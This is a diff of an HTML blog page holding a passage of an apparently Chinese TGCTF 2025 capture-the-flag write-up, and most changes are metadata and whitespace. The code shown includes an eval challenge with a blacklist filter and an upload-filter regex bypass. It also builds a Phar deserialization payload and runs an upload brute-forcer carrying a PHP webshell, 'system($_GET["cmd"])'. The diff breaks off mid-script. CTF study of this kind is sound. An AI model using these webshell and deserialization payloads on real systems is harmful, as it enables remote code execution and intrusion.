@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" web 火眼辩魑魅 进去说shell学姐，显然访问tgshell。\n直接打phpinfo();发现命令可以执行，但是继续执行发现禁了很多，但是发现反引号没禁。\n">
 <title>2025-TGCTF-write.up</title>
@@ -9,7 +9,7 @@
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-TGCTF-write.up">
 <meta property='og:description' content=" web 火眼辩魑魅 进去说shell学姐，显然访问tgshell。\n直接打phpinfo();发现命令可以执行，但是继续执行发现禁了很多，但是发现反引号没禁。\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-tgctf-write.up/'>
-<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:site_name' content='zhizuijimi'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-04-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-12T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-TGCTF-write.up">
 <meta name="twitter:description" content=" web 火眼辩魑魅 进去说shell学姐，显然访问tgshell。\n直接打phpinfo();发现命令可以执行，但是继续执行发现禁了很多，但是发现反引号没禁。\n">
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -71,7 +71,7 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
             <h2 class="site-description"></h2>
         </div>
     </header><ol class="menu-social">
@@ -765,7 +765,7 @@
 </h4><p><img src="/p/2025-tgctf-write.up/image-20250416110219098.png"
 	width="1545"
 	height="212"
-	srcset="/p/2025-tgctf-write.up/image-20250416110219098_hu_570f89bc4bb27b33.png 480w, /p/2025-tgctf-write.up/image-20250416110219098_hu_1af444248cbbed3.png 1024w"
+	srcset="/p/2025-tgctf-write.up/image-20250416110219098_hu_c492bcdf20686658.png 480w, /p/2025-tgctf-write.up/image-20250416110219098_hu_b09706ebe204b5bd.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250416110219098"
@@ -1003,7 +1003,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/0|1|[3-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$tgctf2025</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="nv">$tgctf2025</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$tgctf2025</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;(╯‵□′)╯炸弹！•••*～●&#39;</span><span class="p">);</span>
@@ -1074,7 +1074,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/0|1|[3-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&#34;</span><span class="p">,</span> <span class="nv">$tgctf2025</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="nv">$tgctf2025</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$tgctf2025</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;(╯‵□′)╯炸弹！•••*～●&#39;</span><span class="p">);</span>
@@ -1159,7 +1159,7 @@
 <p><img src="/p/2025-tgctf-write.up/image-20250415110550334.png"
 	width="1602"
 	height="319"
-	srcset="/p/2025-tgctf-write.up/image-20250415110550334_hu_6578f9233d132451.png 480w, /p/2025-tgctf-write.up/image-20250415110550334_hu_9d0587b6970c5bc.png 1024w"
+	srcset="/p/2025-tgctf-write.up/image-20250415110550334_hu_27c420d82cc755e.png 480w, /p/2025-tgctf-write.up/image-20250415110550334_hu_4207f92f3b71714c.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250415110550334"
@@ -1332,53 +1332,53 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;UPLOAD_PATH&#39;</span><span class="p">,</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/uploads/&#39;</span><span class="p">);</span> <span class="c1">// 定义上传文件的存储路径
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> <span class="c1">// 初始化文件上传状态
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="c1">// 初始化消息变量
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span> <span class="c1">// 默认状态码为 200，表示成功
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// 检查是否提交了表单
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 检查上传路径是否存在
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;php2&#34;</span><span class="p">,</span> <span class="s2">&#34;html&#34;</span><span class="p">,</span> <span class="s2">&#34;htm&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">);</span> <span class="c1">// 定义禁止上传的文件扩展名列表
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> <span class="c1">// 初始化文件上传状态
+</span></span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="c1">// 初始化消息变量
+</span></span></span><span class="line"><span class="cl"><span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span> <span class="c1">// 默认状态码为 200，表示成功
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// 检查是否提交了表单
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 检查上传路径是否存在
+</span></span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;php2&#34;</span><span class="p">,</span> <span class="s2">&#34;html&#34;</span><span class="p">,</span> <span class="s2">&#34;htm&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">);</span> <span class="c1">// 定义禁止上传的文件扩展名列表
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// 检查是否通过 GET 方法传递了文件名
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> <span class="c1">// 使用 GET 方法传递的文件名
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> <span class="c1">// 使用 GET 方法传递的文件名
+</span></span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span> <span class="c1">// 使用上传文件的原始文件名
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span> <span class="c1">// 获取文件扩展名
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 检查文件扩展名是否在禁止列表中
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span> <span class="c1">// 获取临时文件路径
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$file_content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">);</span> <span class="c1">// 读取文件内容
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span> <span class="c1">// 获取临时文件路径
+</span></span></span><span class="line"><span class="cl">            <span class="nv">$file_content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">);</span> <span class="c1">// 读取文件内容
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+?&lt;/s&#39;</span><span class="p">,</span> <span class="nv">$file_content</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 检查文件内容是否包含非法字符（但是出题者应该出错了，本来应该是 /&lt;.+?&gt;/s）		#因为正则表达式/.+?&lt;/s要求匹配至少一个字符后跟&lt;，所以如果文件内容以&lt;开头，则无法满足这个模式，因此不会被检测到，从而绕过检查。
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;文件内容包含非法字符，禁止上传！&#39;</span><span class="p">;</span> <span class="c1">// 提示文件内容包含非法字符
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">403</span><span class="p">;</span> <span class="c1">// 设置状态码为 403，表示禁止访问
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;文件内容包含非法字符，禁止上传！&#39;</span><span class="p">;</span> <span class="c1">// 提示文件内容包含非法字符
+</span></span></span><span class="line"><span class="cl">                <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">403</span><span class="p">;</span> <span class="c1">// 设置状态码为 403，表示禁止访问
+</span></span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span> <span class="c1">// 构造目标文件路径
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 将上传的文件移动到目标路径
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> <span class="c1">// 设置文件上传状态为成功
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;文件上传成功！&#39;</span><span class="p">;</span> <span class="c1">// 提示文件上传成功
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 将上传的文件移动到目标路径
+</span></span></span><span class="line"><span class="cl">                    <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> <span class="c1">// 设置文件上传状态为成功
+</span></span></span><span class="line"><span class="cl">                    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;文件上传成功！&#39;</span><span class="p">;</span> <span class="c1">// 提示文件上传成功
+</span></span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span> <span class="c1">// 提示上传出错
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span> <span class="c1">// 设置状态码为 500，表示服务器内部错误
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">                    <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span> <span class="c1">// 设置状态码为 500，表示服务器内部错误
+</span></span></span><span class="line"><span class="cl">                <span class="p">}</span>
 </span></span><span class="line"><span class="cl">            <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;禁止保存为该类型文件！&#39;</span><span class="p">;</span> <span class="c1">// 提示禁止保存为该类型文件
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">403</span><span class="p">;</span> <span class="c1">// 设置状态码为 403，表示禁止访问
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">            <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">403</span><span class="p">;</span> <span class="c1">// 设置状态码为 403，表示禁止访问
+</span></span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span> <span class="c1">// 提示上传路径不存在
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">404</span><span class="p">;</span> <span class="c1">// 设置状态码为 404，表示资源未找到
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">404</span><span class="p">;</span> <span class="c1">// 设置状态码为 404，表示资源未找到
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">// 设置 HTTP 状态码
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">http_response_code</span><span class="p">(</span><span class="nv">$status_code</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="nx">http_response_code</span><span class="p">(</span><span class="nv">$status_code</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">// 输出结果
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span> <span class="c1">// 将结果以 JSON 格式输出
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;status_code&#39;</span> <span class="o">=&gt;</span> <span class="nv">$status_code</span><span class="p">,</span>
+</span></span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span> <span class="c1">// 将结果以 JSON 格式输出
+</span></span></span><span class="line"><span class="cl">    <span class="s1">&#39;status_code&#39;</span> <span class="o">=&gt;</span> <span class="nv">$status_code</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nv">$msg</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl"><span class="p">]);</span>
 </span></span></code></pre></td></tr></table>
@@ -1604,7 +1604,7 @@
 </span></span><span class="line"><span class="cl">        <span class="nx">unserialize</span><span class="p">(</span><span class="nx">best64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// You learn yesterday, you choose today, can you get to your future?
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个链子很显然啊</p>
@@ -1923,7 +1923,7 @@
 </span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nx">best64</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="c1">// You learn yesterday, you choose today, can you get to your future?
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>上面的方法打不了，看到file_exists结合文件上传那就是打phar反序列化了</p>
@@ -2067,11 +2067,11 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">study</span><span class="o">-&gt;</span><span class="na">doing</span><span class="o">=</span><span class="k">new</span> <span class="nx">future</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;3xp.phar&#34;</span><span class="p">);</span> <span class="c1">// 创建一个名为 3xp.phar 的 Phar 文件
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>       <span class="c1">// 开始缓冲，以允许修改 Phar 文件
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span><span class="p">);</span> <span class="c1">// 设置 Phar 文件的存根（Stub），防止被误认为普通 PHP 脚本
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>   <span class="c1">// 将 Chunqiu 对象作为元数据存储在 Phar 文件中
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;exp.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">// 向 Phar 文件中添加一个名为 exp.txt 的文件，内容为 &#34;test&#34;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>        <span class="c1">// 停止缓冲，并生成最终的 Phar 文件
+</span></span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>       <span class="c1">// 开始缓冲，以允许修改 Phar 文件
+</span></span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span><span class="p">);</span> <span class="c1">// 设置 Phar 文件的存根（Stub），防止被误认为普通 PHP 脚本
+</span></span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>   <span class="c1">// 将 Chunqiu 对象作为元数据存储在 Phar 文件中
+</span></span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;exp.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">// 向 Phar 文件中添加一个名为 exp.txt 的文件，内容为 &#34;test&#34;
+</span></span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>        <span class="c1">// 停止缓冲，并生成最终的 Phar 文件
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>但是文件上传设置了后缀，提示是3个小写字母,gpt写一个爆破后缀的代码（一开始也爆不出，将bp抓包的数据给他然后再爆就行）</p>
@@ -2183,18 +2183,18 @@
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1"># 修复1: 严格遵循multipart格式
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">boundary</span> <span class="o">=</span> <span class="s2">&#34;----WebKitFormBoundaryzBu6LJ5xcgw2ScwL&#34;</span>
+</span></span></span><span class="line"><span class="cl">    <span class="nx">boundary</span> <span class="o">=</span> <span class="s2">&#34;----WebKitFormBoundaryzBu6LJ5xcgw2ScwL&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">data</span> <span class="o">=</span> <span class="p">[</span>
 </span></span><span class="line"><span class="cl">        <span class="nx">f</span><span class="s1">&#39;--{boundary}&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="nx">f</span><span class="s1">&#39;Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;test.{ext}&#34;&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Type: application/octet-stream\r\n&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="s1">&#39;GIF89a&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;\r\n&#39;</span><span class="p">,</span>  <span class="c1"># 内容后添加换行
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">f</span><span class="s1">&#39;--{boundary}--\r\n&#39;</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nx">f</span><span class="s1">&#39;--{boundary}--\r\n&#39;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">]</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">        <span class="c1"># 修复2: 正确编码请求体
